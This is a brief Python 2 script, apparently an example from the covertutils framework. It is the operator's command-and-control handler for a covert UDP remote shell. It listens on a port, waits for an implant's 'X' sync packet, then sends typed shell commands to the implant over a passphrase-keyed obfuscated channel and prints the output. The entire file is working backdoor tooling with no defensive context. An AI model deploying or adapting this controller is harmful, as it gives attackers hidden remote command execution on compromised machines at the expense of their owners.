from covertutils.handlers.impl import SimpleShellHandler, BaseHandler
from covertutils.orchestration import SimpleOrchestrator

import sys
import socket
from time import sleep

from hashlib import sha512

try :
	program, port, passphrase = sys.argv
except :
	print """Usage:
	%s <port> <passphrase>""" % sys.argv[0]
	sys.exit(1)

addr = '0.0.0.0', int(port)
client_addr = None
orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, cycling_algorithm = sha512 )

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	#
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind( addr )		# Handling Networking

synchronized = False

def recv () :		# Create wrappers for networking
	global client_addr
	global synchronized
	addr = False
	while addr != client_addr :
		ret, addr = s.recvfrom( 50 )
		if ret == 'X' :
			client_addr = addr
			synchronized = True

	return ret

def send( raw ) :		# Create wrappers for networking
	return s.sendto( raw, client_addr )


class MyHandler( BaseHandler ) :

	def onChunk( self, stream, message ) :	pass
	def onNotRecognised( self ) :	pass

	def onMessage( self, stream, message ) :
		print message


handle = MyHandler( recv, send, orch )

while True :

	if synchronized :
		c = raw_input("(%s:%d) $ " % addr)
		handle.sendAdHoc( c, 'control' )
	sleep(0.1)
